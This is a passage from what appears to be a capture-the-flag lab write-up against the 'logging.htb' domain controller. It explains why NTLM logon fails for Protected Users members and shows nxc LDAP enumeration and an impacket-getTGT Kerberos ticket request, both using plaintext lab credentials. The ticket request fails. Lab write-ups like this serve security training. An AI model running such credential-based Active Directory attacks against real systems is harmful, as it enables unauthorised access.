
This status is returned when the credentials themselves are not the problem, but a policy prevents the logon method from being used, and the classic cause on a domain controller is membership in the Protected Users Group. Members of that Group are barred from NTLM Authentication and can only authenticate over Kerberos. We can confirm the membership directly with our wallace account.

```
nxc ldap logging.htb -u wallace.everette -p 'Welcome2026@' --groups "Protected Users"
```

Let's request an TGT.

```
impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2025'@10.129.56.45
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```

